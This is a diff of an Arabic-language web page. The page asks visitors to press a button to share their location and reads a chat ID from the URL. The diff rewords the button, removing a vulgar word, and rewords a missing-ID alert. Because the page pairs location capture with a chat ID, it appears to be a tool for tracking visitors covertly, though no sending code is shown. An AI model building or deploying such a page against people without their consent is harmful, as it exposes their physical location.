@@ -51,7 +51,7 @@
 </head>
 <body>
     <div class="container">
-        <button onclick="getLocation()">اضغط هنا لنيك لتحديد موقعك</button>
+        <button onclick="getLocation()">اضغط هنا لتحديد موقعك</button>
         <div class="loading" id="loading" style="display: none;"></div>
         <p class="result" id="userLocation"></p>
     </div>
@@ -81,7 +81,7 @@
             const chatId = getParameterByName('chatId');  // احصل على chatId من الـ URL
 
             if (!chatId) {
-                alert("لم يتم العثور على معرف المحادثة في الـ URL.");
+                alert("لم يتم استلام معرف الدردشة (chatId).");
                 document.getElementById("loading").style.display = "none";
                 return;
             }
